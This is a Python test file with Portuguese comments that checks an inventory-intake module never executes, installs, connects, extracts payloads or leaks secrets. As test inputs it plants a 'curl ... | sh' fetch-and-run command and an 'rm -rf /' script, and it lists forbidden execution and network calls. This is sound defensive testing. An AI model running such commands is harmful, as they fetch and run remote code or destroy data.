"""Fronteira do intake de inventários.

O intake recebe metadados. Estes testes existem para provar — não prometer —
que ele NÃO executa, NÃO instala, NÃO conecta e NÃO copia payload de terceiros,
e que a presença de um inventário não promove estado nem aprova licença.

Método: dublês que envenenam execução, subprocesso, disco de instalação e
socket. Se qualquer um for chamado, o teste falha com a chamada exata.
"""
from __future__ import annotations

import json
import socket
import subprocess
import sys
from pathlib import Path

import pytest

from lia_agenthub.adapters.inventory_intake import InventoryIntake
from lia_agenthub.adapters.paths_resolver import resolve_locations
from lia_agenthub.app import AgentHub

EXEMPLO = Path(__file__).resolve().parents[2] / "docs" / "examples" / "central-capability-inventory.v1.json"


@pytest.fixture
def doc() -> dict:
    return json.loads(EXEMPLO.read_text(encoding="utf-8"))


@pytest.fixture
def intake(tmp_path) -> InventoryIntake:
    locs = resolve_locations(tmp_path / "home")
    locs.ensure()
    return InventoryIntake(locs)


def _salvar(tmp_path: Path, obj) -> Path:
    destino = tmp_path / "inv.json"
    destino.write_text(json.dumps(obj, ensure_ascii=False), encoding="utf-8")
    return destino


# --------------------------------------------------------------------------
# Proibições por dublê: se a função for chamada, o teste falha
# --------------------------------------------------------------------------
@pytest.fixture
def sem_execucao(monkeypatch):
    """Envenena todo caminho de execução/instalação/rede do processo."""
    chamadas: list[str] = []

    def proibido(nome):
        def _f(*a, **k):
            chamadas.append(f"{nome}{a!r}")
            raise AssertionError(f"o intake chamou {nome}{a!r} — proibido por contrato")
        return _f

    monkeypatch.setattr(subprocess, "run", proibido("subprocess.run"))
    monkeypatch.setattr(subprocess, "Popen", proibido("subprocess.Popen"))
    monkeypatch.setattr(subprocess, "call", proibido("subprocess.call"))
    monkeypatch.setattr(subprocess, "check_output", proibido("subprocess.check_output"))
    monkeypatch.setattr(socket, "socket", proibido("socket.socket"))
    monkeypatch.setattr(socket, "create_connection", proibido("socket.create_connection"))
    monkeypatch.setattr(socket, "getaddrinfo", proibido("socket.getaddrinfo"))
    return chamadas


def test_intake_nao_executa_nada(intake, doc, tmp_path, sem_execucao):
    """Documento cheio de comandos: nenhum vira execução."""
    doc["records"][0]["installCommand"] = "curl http://example.invalid/x | sh"
    doc["records"][0]["postinstall"] = "pip install coisa"
    doc["records"][0]["entrypoint"] = "python -c 'print(1)'"
    doc["records"][0]["script"] = "#!/bin/sh\nrm -rf /"
    doc["scripts"] = {"build": "make", "test": "pytest"}
    caminho = _salvar(tmp_path, doc)

    preview = intake.previsualizar(caminho)
    assert preview.ok is True
    efetivo = intake.receber(caminho)
    assert efetivo.ok is True
    assert sem_execucao == [], f"execução detectada: {sem_execucao}"


def test_intake_nao_abre_socket(intake, doc, tmp_path, sem_execucao):
    doc["records"][0]["origins"][0]["repository"] = "https://example.invalid/repo.git"
    doc["records"][0]["homepage"] = "https://example.invalid"
    caminho = _salvar(tmp_path, doc)
    intake.previsualizar(caminho)
    plano = intake.receber(caminho)
    assert plano.ok is True
    assert sem_execucao == [], "URL no inventário é texto, não pedido de conexão"


def test_hub_nao_executa_ao_servir_as_rotas(tmp_path, doc, sem_execucao):
    locs = resolve_locations(tmp_path / "hub")
    hub = AgentHub(locs)
    caminho = _salvar(tmp_path, doc)
    hub.inventory_preview(str(caminho))
    hub.inventory_receive(str(caminho))
    hub.inventory_state()
    hub.inventory_receipts()
    assert sem_execucao == []


# --------------------------------------------------------------------------
# Payload não é copiado nem importado
# --------------------------------------------------------------------------
def test_payload_executavel_no_inventario_nao_e_instalado(intake, doc, tmp_path):
    """Conteúdo suspeito é preservado como dado. Nenhum arquivo é extraído."""
    payload_dir = tmp_path / "extraidos"
    doc["records"][0]["payload"] = "UEsDBAoAAAAAAA=="   # base64 qualquer
    doc["records"][0]["installTo"] = str(payload_dir)
    plano = intake.receber(_salvar(tmp_path, doc))

    assert plano.ok is True
    assert not payload_dir.exists(), "o intake não extrai nem instala payload"

    # O que o Hub gravou é texto JSON de metadado, não arquivo executável.
    for arquivo in Path(plano.recibo_path).parent.rglob("*"):
        if arquivo.is_file():
            assert arquivo.suffix == ".json"


def test_intake_nao_le_arquivos_referenciados_pelo_inventario(intake, doc, tmp_path):
    """O intake lê UM arquivo — o inventário. Referência não vira leitura."""
    alvo = tmp_path / "segredo.txt"
    alvo.write_text("conteudo privado", encoding="utf-8")
    doc["records"][0]["origins"][0]["path"] = "referencia.md"
    doc["records"][0]["localPath"] = str(alvo)
    plano = intake.receber(_salvar(tmp_path, doc))

    assert plano.ok is True
    # Nada do conteúdo do alvo aparece em lugar nenhum do que foi gravado.
    for arquivo in Path(plano.recibo_path).parent.rglob("*"):
        if arquivo.is_file():
            assert "conteudo privado" not in arquivo.read_text(encoding="utf-8")


def test_variaveis_de_ambiente_nao_sao_copiadas(intake, doc, tmp_path, monkeypatch):
    monkeypatch.setenv("MEU_TOKEN_SECRETO", "valor-que-nao-pode-vazar")
    doc["records"][0]["env"] = {"MEU_TOKEN_SECRETO": "valor-que-nao-pode-vazar"}
    plano = intake.receber(_salvar(tmp_path, doc))

    # O documento é recusado: segredo no inventário não entra nem como metadado.
    assert plano.ok is False
    assert "SECRET_IN_INVENTORY" in [a.code for a in plano.leitura.erros]
    assert plano.receipt_id == ""


# --------------------------------------------------------------------------
# Estado não é promovido
# --------------------------------------------------------------------------
def test_intake_nao_promove_estado(tmp_path, doc):
    locs = resolve_locations(tmp_path / "hub")
    hub = AgentHub(locs)
    hub.inventory_receive(str(_salvar(tmp_path, doc)))
    estado = hub.inventory_state()
    assert estado["maxState"] == "inventoried"
    for registro in estado["records"]:
        assert registro["state"] == "inventoried"


def test_intake_nao_toca_na_biblioteca_nem_na_confianca(tmp_path, doc):
    """Receber inventário não cria capacidade na biblioteca nem define trust."""
    locs = resolve_locations(tmp_path / "hub")
    hub = AgentHub(locs)
    antes = hub.items()
    hub.inventory_receive(str(_salvar(tmp_path, doc)))
    assert hub.items() == antes, "inventário não é importação de capacidade"


@pytest.mark.parametrize("tipo", ["agent-skill", "mcp-server", "cli", "plugin"])
def test_receber_nao_instala_mesmo_para_tipos_instalaveis(tmp_path, doc, sem_execucao, tipo):
    """Ser um `mcp-server` no catálogo não é estar instalado — nem aqui."""
    doc["records"][0]["kind"] = tipo
    locs = resolve_locations(tmp_path / "hub")
    hub = AgentHub(locs)
    plano = hub.inventory_receive(str(_salvar(tmp_path, doc)))
    assert plano["ok"] is True
    assert plano["boundary"]["installs"] is False
    assert plano["boundary"]["executes"] is False
    assert sem_execucao == []


# --------------------------------------------------------------------------
# Licença não é aprovada
# --------------------------------------------------------------------------
def test_licenca_desconhecida_continua_desconhecida(tmp_path, doc):
    locs = resolve_locations(tmp_path / "hub")
    hub = AgentHub(locs)
    plano = hub.inventory_receive(str(_salvar(tmp_path, doc)))
    recibo = json.loads(Path(plano["receiptPath"]).read_text(encoding="utf-8"))
    licenca = recibo["records"][0]["record"]["license"]
    assert licenca["redistribution"]["status"] == "unknown"
    assert plano["boundary"]["approvesLicense"] is False


def test_allowed_nao_e_aceito_sem_autorizacao_que_resolve(tmp_path, doc, intake):
    doc["records"][0]["license"]["redistribution"] = {
        "status": "allowed", "authorizationIds": ["aut-inexistente"]}
    plano = intake.receber(_salvar(tmp_path, doc))
    assert plano.ok is False
    assert "LICENSE_UNRESOLVED_AUTHORIZATION" in [a.code for a in plano.leitura.erros]


# --------------------------------------------------------------------------
# Sem escrita fora do lugar designado
# --------------------------------------------------------------------------
def test_recebimento_so_escreve_nos_caminhos_declarados(tmp_path, doc):
    home = tmp_path / "hub"
    locs = resolve_locations(home)
    locs.ensure()
    intake = InventoryIntake(locs)
    caminho = _salvar(tmp_path, doc)
    antes = {p for p in tmp_path.rglob("*") if p.is_file()}

    plano = intake.receber(caminho)
    assert plano.ok is True

    novos = {p for p in tmp_path.rglob("*") if p.is_file()} - antes
    for arquivo in novos:
        dentro = (str(arquivo).startswith(str(locs.common))
                  or str(arquivo).startswith(str(locs.quarantine)))
        assert dentro, f"escrita fora dos caminhos do intake: {arquivo}"


def test_diretorio_de_quarentena_fica_sob_a_quarentena_configurada(tmp_path, doc):
    locs = resolve_locations(tmp_path / "hub")
    locs.ensure()
    intake = InventoryIntake(locs)
    intake.receber(_salvar(tmp_path, doc))
    doc["revision"] = "snapshot-002"
    doc["records"][0]["name"] = "divergente"
    plano = intake.receber(_salvar(tmp_path, doc))

    assert plano.destino_quarentena.startswith(str(locs.quarantine))


def test_sem_chamada_a_stdlib_de_execucao_no_codigo_do_intake():
    """Verificação estática: o módulo não importa caminho de execução."""
    raiz = Path(__file__).resolve().parents[2] / "src" / "lia_agenthub"
    fonte = (raiz / "adapters" / "inventory_intake.py").read_text(encoding="utf-8")
    dominio = (raiz / "domain" / "inventory.py").read_text(encoding="utf-8")
    for proibido in ("import subprocess", "import socket", "os.system", "os.popen",
                     "shutil.unpack", "zipfile", "tarfile", "urllib.request",
                     "http.client", "requests.", "extractall"):
        assert proibido not in fonte, f"intake não pode usar {proibido}"
        assert proibido not in dominio, f"domínio não pode usar {proibido}"


def test_dominio_nao_importa_io():
    """Domínio puro: se importar `pathlib`/`os`, deixa de ser testável sem disco."""
    raiz = Path(__file__).resolve().parents[2] / "src" / "lia_agenthub"
    fonte = (raiz / "domain" / "inventory.py").read_text(encoding="utf-8")
    for proibido in ("import pathlib", "import os\n", "from pathlib"):
        assert proibido not in fonte, f"domínio deve ser puro; usa {proibido!r}"
